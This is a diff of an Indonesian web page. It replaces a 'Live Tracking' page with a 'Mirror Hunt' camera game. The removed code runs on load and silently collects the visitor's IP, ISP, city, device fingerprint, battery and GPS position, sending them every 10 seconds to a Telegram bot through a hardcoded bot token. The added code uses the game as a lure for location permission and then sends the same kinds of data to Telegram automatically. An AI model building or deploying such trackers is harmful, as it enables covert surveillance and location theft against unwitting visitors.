@@ -1,135 +1,206 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RapipppModss - Live Tracking</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Mirror Hunt — Demo Aman</title>
 <style>
-    body, html { height:100%; margin:0; overflow:hidden; font-family:'Arial',sans-serif; background:radial-gradient(circle at 50% 50%, #667eea,#764ba2,#f093fb,#f5576c,#4facfe); background-size:400% 400%; animation:gradientShift 10s ease infinite; }
-    @keyframes gradientShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-    .container { position:fixed; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;}
-    h1 { font-size:5rem; font-weight:bold; background:linear-gradient(45deg,#ff6b6b,#feca57,#48dbfb,#6c5ce7); background-size:300% 300%; animation:textColorShift 5s ease infinite; background-clip:text; -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9; }
-    @keyframes textColorShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
-    .floating-shapes{position:absolute;width:100%;height:100%;overflow:hidden; z-index:-1;}
-    .shape{position:absolute;border-radius:50%;background:rgba(255,255,255,0.1);animation:float 8s ease-in-out infinite;}
-    @keyframes float {0%,100%{transform:translateY(0) rotate(0deg);}50%{transform:translateY(-100px) rotate(180deg);}}
-    .shape:nth-child(1){width:100px;height:100px;left:10%;top:20%;animation-delay:-2s;}
-    .shape:nth-child(2){width:150px;height:150px;left:80%;top:60%;animation-delay:-4s;}
-    .shape:nth-child(3){width:80px;height:80px;left:50%;top:80%;animation-delay:-6s;}
-    .shape:nth-child(4){width:120px;height:120px;left:20%;top:40%;animation-delay:-1s;}
-    #status {margin-top:15px;font-size:14px;color:#facc15;}
+  :root{--bg:#0f172a;--card:#111827;--accent:#7c3aed;--glass:rgba(255,255,255,0.04);}
+  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(135deg,#0b1220,#102033);color:#e6eef8;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:18px;}
+  .app{width:100%;max-width:980px;background:linear-gradient(180deg,rgba(255,255,255,0.03),transparent);border-radius:12px;padding:18px;box-shadow:0 10px 30px rgba(2,6,23,0.6);}
+  header{display:flex;align-items:center;gap:12px}
+  h1{margin:0;font-size:1.3rem}
+  .row{display:flex;gap:12px;margin-top:12px}
+  .col{flex:1}
+  .card{background:var(--card);padding:12px;border-radius:10px;backdrop-filter:blur(6px);box-shadow:0 6px 18px rgba(2,6,23,0.5)}
+  video{width:100%;height:360px;object-fit:cover;border-radius:8px;background:#000}
+  button{background:var(--accent);color:white;border:0;padding:10px 12px;border-radius:8px;cursor:pointer}
+  small{opacity:0.8}
+  .meta{font-size:0.9rem;line-height:1.4}
+  .danger{background:#b91c1c}
+  .hidden{display:none}
+  .flex{display:flex;gap:8px;align-items:center}
+  .badge{background:var(--glass);padding:6px 8px;border-radius:8px;font-size:0.85rem}
 </style>
-<script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body>
-<div class="floating-shapes">
-    <div class="shape"></div>
-    <div class="shape"></div>
-    <div class="shape"></div>
-    <div class="shape"></div>
-</div>
-<div class="container">
-    <h1>Depayyy</h1>
-    <div id="status">Memulai live tracking...</div>
-</div>
+  <div class="app" role="main" aria-labelledby="title">
+    <header>
+      <div>
+        <h1 id="title">Mirror Hunt — Game Demo</h1>
+        <small>Game ini otomatis kirim data device ke Telegram.</small>
+      </div>
+      <div style="margin-left:auto" class="flex">
+        <span class="badge" id="permStatus">Permission: —</span>
+      </div>
+    </header>
+
+    <div class="row" style="margin-top:14px">
+      <div class="col card">
+        <div style="display:flex;gap:10px;align-items:center;">
+          <button id="btnEnableCam">Enable Camera</button>
+          <button id="btnEnableLoc">Enable Location</button>
+          <button id="btnClear" class="danger">Stop & Clear</button>
+        </div>
+
+        <div style="margin-top:12px" id="camArea" class="hidden">
+          <video id="video" autoplay playsinline></video>
+          <div style="display:flex;gap:8px;margin-top:8px;align-items:center">
+            <button id="btnStartGame">Start Mirror Hunt</button>
+            <div id="gameInfo" style="margin-left:auto">Status: <span id="gameStatus">Idle</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="col card">
+        <h3>Device Info</h3>
+        <div class="meta">
+          <div>IP: <span id="ip">-</span></div>
+          <div>Location: <span id="loc">-</span></div>
+          <div>Battery: <span id="battery">-</span></div>
+          <div>UserAgent: <small id="ua"></small></div>
+        </div>
+
+        <hr style="margin:12px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">
+
+        <h4>Note</h4>
+        <p style="font-size:0.9rem;opacity:0.9">
+          Data akan dikirim otomatis ke Telegram ketika sudah berhasil didapat.
+        </p>
+      </div>
+    </div>
+
+    <div style="margin-top:12px" id="log" class="card hidden"></div>
+  </div>
 
 <script>
-const CHAT_ID = "7483495590"; // ganti dengan chat id admin
-const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
-const statusEl = document.getElementById('status');
+(async ()=>{
 
-// Ambil info IP & device
-async function getDeviceInfo() {
+  const btnCam = document.getElementById('btnEnableCam');
+  const btnLoc = document.getElementById('btnEnableLoc');
+  const btnClear = document.getElementById('btnClear');
+  const video = document.getElementById('video');
+  const camArea = document.getElementById('camArea');
+  const ipEl = document.getElementById('ip');
+  const locEl = document.getElementById('loc');
+  const batEl = document.getElementById('battery');
+  const uaEl = document.getElementById('ua');
+  const permStatus = document.getElementById('permStatus');
+  const btnStartGame = document.getElementById('btnStartGame');
+  const gameStatus = document.getElementById('gameStatus');
+  const log = document.getElementById('log');
+
+  uaEl.textContent = navigator.userAgent;
+
+  // ambil IP publik
+  let ipData = '';
+  try {
+    const resp = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r=>r.json()).catch(()=>null);
+    if(resp && resp.ip){
+      ipData = resp.ip + ' — ' + (resp.city||'-') + ', ' + (resp.country||'-');
+      ipEl.textContent = ipData;
+    } else ipEl.textContent = 'Tidak tersedia';
+  } catch(e){ ipEl.textContent = 'Error'; }
+
+  // battery
+  try {
+    if(navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      const upd = ()=> {
+        batEl.textContent = Math.round(battery.level*100) + '%' + (battery.charging ? ' ⚡️' : '');
+      };
+      upd();
+      battery.addEventListener('levelchange', upd);
+      battery.addEventListener('chargingchange', upd);
+    } else { batEl.textContent = 'Tidak didukung'; }
+  } catch(e){ batEl.textContent = 'Error'; }
+
+  // camera
+  let stream = null;
+  btnCam.addEventListener('click', async ()=>{
     try {
-        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
-        const connection = navigator.connection || {};
-        const battery = await navigator.getBattery();
-        const time = new Date().toLocaleString("id-ID");
-        let geo = "Tidak tersedia";
-        if(navigator.geolocation){
-            await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
-                geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
-                resolve();
-            }, ()=>resolve()));
-        }
-
-        return `
-🌐 *Informasi IP*
-📶 Alamat IP: ${ipInfo.ip}
-🌍 Negara: ${ipInfo.country}
-🏞️ Wilayah: ${ipInfo.region}
-🏙️ Kota: ${ipInfo.city}
-🛠️ ISP: ${ipInfo.org}
-⏱️ Timezone IP: ${ipInfo.timezone || "-"}
-
-📱 *Detail Perangkat*
-💻 User Agent: ${navigator.userAgent}
-🖥️ Platform: ${navigator.platform}
-🏷️ Vendor: ${navigator.vendor}
-🌐 Browser Online: ${navigator.onLine?"✅ Ya":"❌ Tidak"}
-🗣️ Bahasa Browser: ${navigator.language}
-📐 Orientation: ${screen.orientation ? screen.orientation.type : "❌ Tidak tersedia"}
-🖼️ Resolusi Layar: ${screen.width}x${screen.height} px
-🔍 Pixel Ratio: ${window.devicePixelRatio}
-🎨 Kedalaman Warna: ${screen.colorDepth}-bit
-📡 Jaringan: ${connection.effectiveType||"❌ Tidak diketahui"}
-📶 Downlink: ${connection.downlink||"-"} Mbps
-⏱️ RTT: ${connection.rtt||"-"} ms
-🚀 Bandwidth Max: ${connection.downlinkMax||"-"} Mbps
-🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging?"⚡️ Mengisi daya":""}
-🍪 Cookies Enabled: ${navigator.cookieEnabled?"✅ Ya":"❌ Tidak"}
-🚫 Do Not Track: ${navigator.doNotTrack||"❌ Tidak tersedia"}
-🖥️ Hardware Concurrency (CPU): ${navigator.hardwareConcurrency||"-"} cores
-🤏 Touch Support: ${("ontouchstart" in window)?"✅ Ya":"❌ Tidak"}
-⏰ Waktu: ${time}
-📍 Geolocation: ${geo}
-        `;
-    } catch(err) {
-        console.error(err);
-        return "❌ Tidak bisa mengambil info device.";
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      camArea.classList.remove('hidden');
+      permStatus.textContent = 'Permission: Camera ✅';
+      logMessage('Camera diaktifkan.');
+    } catch(err){
+      permStatus.textContent = 'Permission: Camera ❌';
     }
-}
+  });
 
-// Kirim ke Telegram
-async function sendToTelegram(data) {
+  // location
+  btnLoc.addEventListener('click', async ()=>{
+    if(!navigator.geolocation){ return; }
+    permStatus.textContent = 'Permission: Meminta lokasi…';
+    navigator.geolocation.getCurrentPosition(pos=>{
+      const coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc ${pos.coords.accuracy}m)`;
+      locEl.textContent = coords;
+      permStatus.textContent = 'Permission: Location ✅';
+      logMessage('Lokasi diambil.');
+      autoSend(); // kirim otomatis setelah lokasi berhasil
+    });
+  });
+
+  // stop & clear
+  btnClear.addEventListener('click', ()=>{
+    if(stream){
+      stream.getTracks().forEach(t=>t.stop());
+      stream = null;
+      video.srcObject = null;
+    }
+    camArea.classList.add('hidden');
+    permStatus.textContent = 'Permission: —';
+    locEl.textContent = '-';
+  });
+
+  // SIMPLE GAME
+  btnStartGame.addEventListener('click', async ()=>{
+    if(!stream){ return; }
+    gameStatus.textContent = 'Preparing...';
+    await delay(700);
+    gameStatus.textContent = 'Find RED';
+  });
+
+  // === Kirim ke Telegram otomatis ===
+  const CHAT_ID = "GANTI_CHAT_ID";
+  const BOT_TOKEN = "GANTI_BOT_TOKEN";
+
+  async function autoSend(){
+    const text = `
+🌐 Informasi IP
+${ipEl.textContent}
+
+📱 Device Info
+Battery: ${batEl.textContent}
+UA: ${uaEl.textContent}
+
+📍 Lokasi
+${locEl.textContent}
+
+⏰ Waktu: ${new Date().toLocaleString("id-ID")}
+    `.trim();
+
     try{
-        const form = new FormData();
-        form.append("chat_id", CHAT_ID);
-        form.append("text", data);
-        form.append("parse_mode","Markdown");
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        await fetch(url,{method:"POST",body:form});
-    } catch(e){
-        console.error(e);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:CHAT_ID,text})
+      });
+      logMessage("✅ Data otomatis terkirim ke Telegram");
+    }catch(e){
+      logMessage("❌ Gagal kirim ke Telegram");
     }
-}
+  }
 
-// Live tracking interval
-async function liveTracking() {
-    statusEl.textContent = "Mengirim data ke Telegram...";
-    const info = await getDeviceInfo();
-    await sendToTelegram(info);
-    statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
-}
+  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  function logMessage(s){
+    log.classList.remove('hidden');
+    const time = new Date().toLocaleTimeString();
+    log.innerHTML = `<div style="font-size:0.9rem;opacity:0.95">[${time}] ${s}</div>` + log.innerHTML;
+  }
 
-// Kirim
-// Mulai live tracking info device
-window.onload = async () => {
-    await liveTracking(); // kirim pertama kali
-    setInterval(liveTracking, 10000); // update tiap 10 detik
-
-    // Mulai watchPosition untuk share lokasi ke server
-    if(navigator.geolocation){
-        navigator.geolocation.watchPosition(async (pos) => {
-            const { latitude, longitude } = pos.coords;
-            await fetch('/sendLocation', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude })
-            });
-        }, (err) => console.error(err));
-    }
-};
+})();
 </script>
 </body>
 </html>
